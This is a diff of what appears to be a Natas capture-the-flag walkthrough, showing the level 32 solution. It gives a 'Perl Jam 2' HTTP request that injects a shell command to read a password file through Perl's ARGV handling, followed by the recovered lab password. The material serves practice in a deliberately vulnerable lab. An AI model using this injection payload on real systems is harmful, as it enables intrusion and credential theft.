@@ -109,13 +109,14 @@
 #### Level32
 * The Perl Jam 2 Vulnerability
 >   POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
->   -----------------------------416450785040312578442700592
 
->   Content-Disposition: form-data; name="file";
+>>   -----------------------------416450785040312578442700592
 
->   Content-Type: text/plain
+>>   Content-Disposition: form-data; name="file";
 
->   ARGV
+>>   Content-Type: text/plain
+
+>>   ARGV
 * no1vohsheCaiv3ieH4em1ahchisainge
 
 #### Level33
